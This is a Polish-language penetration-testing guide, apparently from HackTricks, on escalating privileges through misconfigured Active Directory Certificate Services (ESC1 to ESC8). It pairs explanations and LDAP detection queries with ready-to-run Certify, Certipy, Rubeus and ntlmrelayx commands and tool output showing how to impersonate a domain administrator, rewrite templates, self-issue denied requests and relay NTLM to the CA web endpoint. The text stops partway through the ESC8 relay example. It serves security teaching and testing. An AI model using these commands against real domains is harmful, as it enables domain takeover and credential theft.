# Eskalacja domeny AD CS

{{#include ../../../banners/hacktricks-training.md}}


**To jest podsumowanie sekcji dotyczących technik eskalacji z postów:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Błędnie skonfigurowane szablony certyfikatów - ESC1 — wyjaśnienie

- **Uprawnienia do rejestracji są nadawane niskoprzywilejowanym użytkownikom przez Enterprise CA.**
- **Zatwierdzenie przełożonego nie jest wymagane.**
- **Podpisy upoważnionego personelu nie są potrzebne.**
- **Deskryptory zabezpieczeń na szablonach certyfikatów są nadmiernie liberalne, pozwalając niskoprzywilejowanym użytkownikom na uzyskanie uprawnień do rejestracji.**
- **Szablony certyfikatów są skonfigurowane tak, by definiować EKU ułatwiające uwierzytelnianie:**
- Identyfikatory Extended Key Usage (EKU), takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), lub brak EKU (SubCA) są uwzględnione.
- **Szablon zezwala wnioskodawcom na dołączenie subjectAltName do Certificate Signing Request (CSR):**
- Active Directory (AD) traktuje subjectAltName (SAN) w certyfikacie priorytetowo przy weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że poprzez określenie SAN w CSR można zażądać certyfikatu umożliwiającego podszycie się pod dowolnego użytkownika (np. administratora domeny). Możliwość określenia SAN przez wnioskodawcę jest wskazana w obiekcie AD szablonu certyfikatu przez właściwość `mspki-certificate-name-flag`. Właściwość ta jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` umożliwia wnioskodawcy określenie SAN.

> [!CAUTION]
> Opisana konfiguracja pozwala niskoprzywilejowanym użytkownikom żądać certyfikatów z dowolnym wybranym SAN, co umożliwia uwierzytelnianie się jako dowolny podmiot domenowy przez Kerberos lub SChannel.

Funkcja ta bywa włączana, aby wspierać generowanie certyfikatów HTTPS lub certyfikatów hostów "w locie" przez produkty lub usługi wdrożeniowe, albo z powodu braku zrozumienia.

Zauważono, że utworzenie certyfikatu z tą opcją generuje ostrzeżenie, czego nie ma w przypadku skopiowania istniejącego szablonu certyfikatu (takiego jak szablon `WebServer`, który ma włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) i następnie zmodyfikowania go w celu dodania OID uwierzytelniania.

### Nadużycie

Aby **znaleźć podatne szablony certyfikatów** możesz uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby **wykorzystać tę podatność do podszycia się pod administratora**, można uruchomić:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekonwertować wygenerowany certyfikat na format `.pfx` i ponownie użyć go do uwierzytelnienia za pomocą Rubeus lub certipy:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binarne pliki Windows "Certreq.exe" i "Certutil.exe" mogą być użyte do wygenerowania PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Wyliczenie szablonów certyfikatów w schemacie konfiguracji lasu AD, konkretnie tych, które nie wymagają zatwierdzenia ani podpisów, posiadają EKU Client Authentication lub Smart Card Logon oraz mają włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można wykonać uruchamiając następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Nieprawidłowo skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia jest wariacją pierwszego:

1. Uprawnienia do rejestracji certyfikatów są przyznawane użytkownikom o niskich uprawnieniach przez Enterprise CA.
2. Wymóg zatwierdzenia przez managera jest wyłączony.
3. Wymóg autoryzowanych podpisów jest pominięty.
4. Zbyt liberalny deskryptor zabezpieczeń na szablonie certyfikatu przyznaje prawa do rejestracji certyfikatów użytkownikom o niskich uprawnieniach.
5. **Szablon certyfikatu jest zdefiniowany tak, aby zawierać Any Purpose EKU lub no EKU.**

The **Any Purpose EKU** pozwala atakującemu uzyskać certyfikat do **dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu itp. Ten sam **technique used for ESC3** można wykorzystać do eksploatacji tego scenariusza.

Certyfikaty z **no EKUs**, które działają jako subordinate CA certificates, mogą być wykorzystane do **dowolnego celu** i **również mogą być użyte do podpisywania nowych certyfikatów**. W związku z tym atakujący mógłby określić dowolne EKU lub pola w nowych certyfikatach, wykorzystując subordinate CA certificate.

Jednak nowe certyfikaty utworzone dla **domain authentication** nie będą działać, jeśli subordinate CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Niemniej jednak atakujący nadal może tworzyć **nowe certyfikaty z dowolnym EKU** i arbitralnymi wartościami certyfikatu. Mogą one być potencjalnie **nadużyte** do szerokiego zakresu celów (np. podpisywanie kodu, uwierzytelnianie serwera itp.) i mogą mieć istotne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.

Aby wyenumerować szablony pasujące do tego scenariusza w schemacie konfiguracji lasu AD, można uruchomić następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Nieprawidłowo skonfigurowane szablony Enrolment Agent - ESC3

### Wyjaśnienie

Ten scenariusz jest podobny do pierwszego i drugiego, ale **wykorzystuje** inny EKU (Certificate Request Agent) i **2 różne szablony** (w związku z tym ma 2 zestawy wymagań),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), znany jako **Enrollment Agent** w dokumentacji Microsoft, umożliwia podmiotowi **wnioskowanie o certyfikat w imieniu innego użytkownika**.

The **“enrollment agent”** wnioskuje o taki **szablon** i używa otrzymanego **certyfikatu do współpodpisania CSR w imieniu innego użytkownika**. Następnie **wysyła** współpodpisany CSR do CA, wnioskując o **szablon**, który **pozwala na “enroll on behalf of”**, a CA odpowiada wydając **certyfikat należący do “innego” użytkownika**.

**Wymagania 1:**

- Enterprise CA przyznaje prawa do rejestracji użytkownikom o niskich uprawnieniach.
- Wymóg zatwierdzenia przez przełożonego jest pominięty.
- Brak wymogu autoryzowanych podpisów.
- Deskriptor zabezpieczeń szablonu certyfikatu jest nadmiernie liberalny, przyznając prawa do rejestracji użytkownikom o niskich uprawnieniach.
- Szablon certyfikatu zawiera Certificate Request Agent EKU, umożliwiając żądanie innych szablonów certyfikatów w imieniu innych podmiotów.

**Wymagania 2:**

- Enterprise CA przyznaje prawa do rejestracji użytkownikom o niskich uprawnieniach.
- Zatwierdzenie przez przełożonego jest ominięte.
- Wersja schematu szablonu jest albo 1, albo większa niż 2, i określa Application Policy Issuance Requirement, które wymaga Certificate Request Agent EKU.
- EKU zdefiniowany w szablonie certyfikatu pozwala na uwierzytelnianie domenowe.
- Ograniczenia dla enrollment agents nie są stosowane na CA.

### Nadużycie

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy) aby wykorzystać ten scenariusz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

- **Owner:** Daje niejawne uprawnienia kontroli nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
- **FullControl:** Pozwala na pełną kontrolę nad obiektem, włącznie z możliwością zmiany dowolnych atrybutów.
- **WriteOwner:** Umożliwia zmianę właściciela obiektu na podmiot kontrolowany przez atakującego.
- **WriteDacl:** Pozwala na modyfikację kontroli dostępu, potencjalnie przyznając atakującemu FullControl.
- **WriteProperty:** Uprawnia do edycji dowolnych właściwości obiektu.

### Abuse

To identify principals with edit rights on templates and other PKI objects, enumerate with Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Przykład privesc podobny do poprzedniego:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ma miejsce, gdy użytkownik ma uprawnienia zapisu do szablonu certyfikatu. Można to na przykład wykorzystać do nadpisania konfiguracji szablonu certyfikatu, aby uczynić szablon podatnym na ESC1.

Jak widać powyżej, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nowe `AddKeyCredentialLink` edge do `JOHNPC`. Ponieważ ta technika jest związana z certyfikatami, zaimplementowałem również ten atak, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Oto krótkie spojrzenie na polecenie `shadow auto` w Certipy, służące do pobrania NT hash ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu jednym poleceniem. **Domyślnie**, Certipy **nadpisze** konfigurację, aby uczynić ją **podatną na ESC1**. Możemy też określić **`-save-old` parametr do zapisania starej konfiguracji**, co będzie przydatne do **przywrócenia** konfiguracji po naszym ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

Obszerna sieć powiązań opartych na ACL, obejmująca kilka obiektów wykraczających poza szablony certyfikatów i Certification Authority, może wpływać na bezpieczeństwo całego systemu AD CS. Te obiekty, które mogą znacząco oddziaływać na bezpieczeństwo, obejmują:

- Obiekt komputera AD serwera CA, który może zostać przejęty za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
- Serwer RPC/DCOM powiązany z serwerem CA.
- Każdy potomny obiekt AD lub kontener w obrębie konkretnej ścieżki kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ta ścieżka obejmuje, między innymi, kontenery i obiekty takie jak the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object oraz the Enrollment Services Container.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli atakujący o niskich uprawnieniach uzyska kontrolę nad którymkolwiek z tych krytycznych komponentów.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

Temat poruszony w [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) odnosi się również do implikacji flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, opisanej przez Microsoft. Ta konfiguracja, po włączeniu na Certification Authority (CA), pozwala na umieszczenie **wartości zdefiniowanych przez użytkownika** w **subject alternative name** dla **dowolnego żądania**, w tym tych tworzonych z Active Directory®. W efekcie umożliwia to **intruzowi** zarejestrowanie się za pomocą **dowolnego szablonu** skonfigurowanego do domenowej **autentykacji** — szczególnie tych otwartych dla rejestracji przez **użytkowników o niskich uprawnieniach**, jak standardowy User template. W rezultacie można uzyskać certyfikat, który pozwala intruzowi uwierzytelnić się jako administrator domeny lub **jakikolwiek inny aktywny podmiot** w domenie.

**Note**: Podejście do dodawania **alternatywnych nazw** do Certificate Signing Request (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (określanego jako “Name Value Pairs”) kontrastuje ze strategią wykorzystania SAN w ESC1. Różnica polega tu na **sposobie enkapsulacji informacji o koncie** — w atrybucie certyfikatu, zamiast w rozszerzeniu.

### Abuse

Aby sprawdzić, czy ustawienie jest włączone, organizacje mogą użyć następującego polecenia z `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja zasadniczo wykorzystuje **remote registry access**, zatem alternatywnym podejściem może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykryć tę nieprawidłową konfigurację i ją wykorzystać:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, zakładając, że posiada się prawa **domain administrative** lub równoważne, można wykonać następujące polecenie z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Po majowych aktualizacjach zabezpieczeń z 2022 roku, nowo wydane **certyfikaty** będą zawierać **rozszerzenie bezpieczeństwa**, które zawiera **właściwość `objectSid`` żądającego**. Dla ESC1 ten SID jest wyprowadzany ze wskazanego SAN. Jednak dla **ESC6** SID odzwierciedla **`objectSid` żądającego**, a nie SAN.\
> Aby wykorzystać ESC6, konieczne jest, aby system był podatny na ESC10 (Weak Certificate Mappings), które faworyzuje **SAN ponad nowe rozszerzenie bezpieczeństwa**.

## Kontrola dostępu Certificate Authority podatna na atak - ESC7

### Atak 1

#### Wyjaśnienie

Kontrola dostępu do Certificate Authority jest utrzymywana za pomocą zestawu uprawnień regulujących działania CA. Uprawnienia te można wyświetlić, otwierając `certsrv.msc`, klikając prawym przyciskiem myszy na CA, wybierając Właściwości, a następnie przechodząc do zakładki Zabezpieczenia. Dodatkowo uprawnienia można zenumerować przy użyciu modułu PSPKI za pomocą poleceń takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
To dostarcza wglądu w podstawowe uprawnienia, mianowicie **`ManageCA`** i **`ManageCertificates`**, odpowiadające odpowiednio rolom „administrator CA” i „Menedżer certyfikatów”.

#### Abuse

Posiadanie praw **`ManageCA`** na urzędzie certyfikacji pozwala podmiotowi zdalnie modyfikować ustawienia za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`** w celu zezwolenia na określenie SAN w dowolnym szablonie, co jest krytycznym elementem eskalacji domeny.

Uproszczenie tego procesu jest możliwe dzięki użyciu cmdletu PSPKI **Enable-PolicyModuleFlag**, pozwalającego na modyfikacje bez bezpośredniej interakcji z GUI.

Posiadanie praw **`ManageCertificates`** ułatwia zatwierdzanie oczekujących wniosków, skutecznie omijając zabezpieczenie "CA certificate manager approval".

Kombinacja modułów **Certify** i **PSPKI** może być wykorzystana do żądania, zatwierdzania i pobierania certyfikatu:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Atak 2

#### Wyjaśnienie

> [!WARNING]
> W **poprzednim ataku** uprawnienia **`Manage CA`** zostały użyte do **włączenia** flagi **EDITF_ATTRIBUTESUBJECTALTNAME2** aby przeprowadzić **ESC6 attack**, ale nie będzie to miało żadnego efektu dopóki usługa CA (`CertSvc`) nie zostanie zrestartowana. Kiedy użytkownik ma prawo dostępu `Manage CA`, użytkownik może także **zrestartować usługę**. Jednakże to **nie oznacza, że użytkownik może zrestartować usługę zdalnie**. Ponadto, E**SC6 might not work out of the box** w większości załatanych środowisk z powodu aktualizacji bezpieczeństwa z maja 2022.

Dlatego tutaj przedstawiono inny atak.

Wymagania wstępne:

- Tylko **`ManageCA` uprawnienie**
- Uprawnienie **`Manage Certificates`** (może być przyznane przez **`ManageCA`**)
- Szablon certyfikatu **`SubCA`** musi być **włączony** (może być włączony przez **`ManageCA`**)

Technika opiera się na tym, że użytkownicy z prawami dostępu `Manage CA` _i_ `Manage Certificates` mogą **wystawiać odrzucone żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale w szablonie rejestrować się mogą **tylko administratorzy**. Zatem **użytkownik** może **zażądać** rejestracji w **`SubCA`** - które zostanie **odrzucone** - ale **następnie wydane przez menedżera**.

#### Nadużycie

Możesz **przyznać sobie uprawnienie `Manage Certificates`** poprzez dodanie swojego użytkownika jako nowego oficera.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** może być **włączony na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy warunki wstępne tego ataku, możemy zacząć od **złożenia żądania certyfikatu opartego na szablonie `SubCA`**.

**To żądanie zostanie odrzucone**, ale zachowamy klucz prywatny i zanotujemy ID żądania.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mając **`Manage CA` and `Manage Certificates`**, możemy następnie **wydać nieudane żądanie certyfikatu** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na koniec możemy **pobrać wydany certyfikat** przy użyciu polecenia `req` i parametru `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Atak 3 – Manage Certificates Extension Abuse (SetExtension)

#### Wyjaśnienie

Oprócz klasycznych nadużyć ESC7 (włączania atrybutów EDITF lub zatwierdzania oczekujących żądań), **Certify 2.0** ujawnił zupełnie nowy prymityw, który wymaga jedynie roli *Manage Certificates* (czyli **Certificate Manager / Officer**) na Enterprise CA.

Metodę RPC `ICertAdmin::SetExtension` może wykonać dowolny podmiot posiadający *Manage Certificates*. Chociaż metoda tradycyjnie była używana przez legalne CA do aktualizacji rozszerzeń w **oczekujących** żądaniach, atakujący może jej nadużyć, aby **dołączyć *niestandardowe* rozszerzenie certyfikatu** (na przykład niestandardowy OID *Certificate Issuance Policy* taki jak `1.1.1.1`) do żądania oczekującego na zatwierdzenie.

Ponieważ docelowy template **nie definiuje wartości domyślnej dla tego rozszerzenia**, CA NIE nadpisze wartości kontrolowanej przez atakującego, gdy żądanie zostanie ostatecznie wydane. W efekcie certyfikat zawiera wybrane przez atakującego rozszerzenie, które może:

* Spełniać wymagania Application / Issuance Policy innych podatnych szablonów (prowadząc do eskalacji uprawnień).
* Wstrzyknąć dodatkowe EKU lub polityki, które nadadzą certyfikatowi nieoczekiwane zaufanie w systemach third-party.

Krótko mówiąc, *Manage Certificates* – wcześniej uważane za „mniej potężną” połowę ESC7 – może teraz zostać wykorzystane do pełnej eskalacji uprawnień lub długotrwałej persystencji, bez modyfikacji konfiguracji CA i bez potrzeby bardziej restrykcyjnego prawa *Manage CA*.

#### Wykorzystanie prymitywu z Certify 2.0

1. **Złóż żądanie certyfikatu, które pozostanie *pending*.** Można to wymusić przy pomocy template wymagającego zatwierdzenia przez managera:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dołącz niestandardowe rozszerzenie do oczekującego żądania** używając nowego polecenia `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Jeśli template nie definiuje już rozszerzenia *Certificate Issuance Policies*, powyższa wartość zostanie zachowana po wydaniu.*

3. **Wydaj żądanie** (jeśli Twoja rola ma również prawa zatwierdzania *Manage Certificates*) lub poczekaj, aż operator je zatwierdzi. Po wydaniu pobierz certyfikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Otrzymany certyfikat zawiera teraz złośliwy OID issuance-policy i może być wykorzystany w kolejnych atakach (np. ESC13, eskalacja w domenie itp.).

> NOTE:  Ten sam atak można wykonać przy pomocy Certipy ≥ 4.7 za pomocą polecenia `ca` i parametru `-set-extension`.

## NTLM Relay do punktów końcowych HTTP AD CS – ESC8

### Wyjaśnienie

> [!TIP]
> W środowiskach, gdzie **AD CS jest zainstalowany**, jeśli istnieje **vulnerable web enrollment endpoint** i co najmniej jeden **certificate template jest publikowany**, który pozwala na **domain computer enrollment oraz client authentication** (tak jak domyślny **`Machine`** template), staje się możliwe, że **każdy komputer z aktywną usługą spooler service może zostać przejęty przez atakującego**!

AD CS wspiera kilka **metod rejestracji opartych na HTTP**, udostępnianych przez dodatkowe role serwera, które administratorzy mogą zainstalować. Interfejsy te do HTTP-based certificate enrollment są podatne na **NTLM relay attacks**. Atakujący, z **skompro-mitowanej maszyny**, może podszyć się pod dowolne konto AD, które uwierzytelnia się za pomocą przychodzącego NTLM. Podszywając się pod konto ofiary, atakujący może uzyskać dostęp do tych interfejsów sieciowych, aby **zażądać client authentication certificate używając template `User` lub `Machine`**.

- Interfejs **web enrollment** (starsza aplikacja ASP dostępna pod `http://<caserver>/certsrv/`) domyślnie działa tylko na HTTP, które nie chroni przed NTLM relay attacks. Dodatkowo explicite dopuszcza tylko NTLM w Authorization HTTP header, uniemożliwiając użycie bezpieczniejszych metod uwierzytelniania jak Kerberos.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service oraz **Network Device Enrollment Service** (NDES) domyślnie wspierają negotiate authentication za pomocą Authorization HTTP header. Negotiate authentication **obsługuje zarówno** Kerberos jak i **NTLM**, pozwalając atakującemu na **downgrade do NTLM** podczas relayu. Choć te web services domyślnie włączają HTTPS, samo HTTPS **nie zabezpiecza przed NTLM relay attacks**. Ochrona przed NTLM relay dla usług HTTPS jest możliwa tylko, gdy HTTPS jest połączone z channel binding. Niestety, AD CS nie aktywuje Extended Protection for Authentication na IIS, które jest wymagane do channel binding.

Częstym **problemem** w NTLM relay attacks jest **krótki czas trwania sesji NTLM** oraz niemożność atakującego do interakcji z usługami, które wymagają NTLM signing.

Mimo to, ograniczenie to można ominąć wykorzystując NTLM relay attack do zdobycia certyfikatu dla użytkownika — to okres ważności certyfikatu determinuje długość sesji, a certyfikat może być użyty z usługami, które **wymagają NTLM signing**. Instrukcje dotyczące wykorzystania skradzionego certyfikatu znajdują się w:


{{#ref}}
account-persistence.md
{{#endref}}

Innym ograniczeniem NTLM relay jest to, że **maszyna kontrolowana przez atakującego musi zostać uwierzytelniona przez konto ofiary**. Atakujący może albo poczekać, albo spróbować **wymusić** to uwierzytelnienie:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Nadużycie**

Polecenie `cas` z [**Certify**](https://github.com/GhostPack/Certify) wylicza **włączone punkty końcowe HTTP AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez enterprise Certificate Authorities (CAs) do przechowywania punktów końcowych Certificate Enrollment Service (CES). Te punkty końcowe można sparsować i wypisać, używając narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Nadużycie przy użyciu Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Nadużycie z [Certipy](https://github.com/ly4k/Certipy)

Żądanie certyfikatu jest domyślnie wysyłane przez Certipy na podstawie szablonu `Machine` lub `User`; wybór zależy od tego, czy nazwa konta będącego przekazywana kończy się znakiem `$`. Specyfikacja alternatywnego szablonu może zostać osiągnięta za pomocą parametru `-template`.

Technikę taką jak [PetitPotam](https://github.com/ly4k/PetitPotam) można następnie zastosować, aby wymusić uwierzytelnienie. W przypadku kontrolerów domeny wymagane jest określenie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
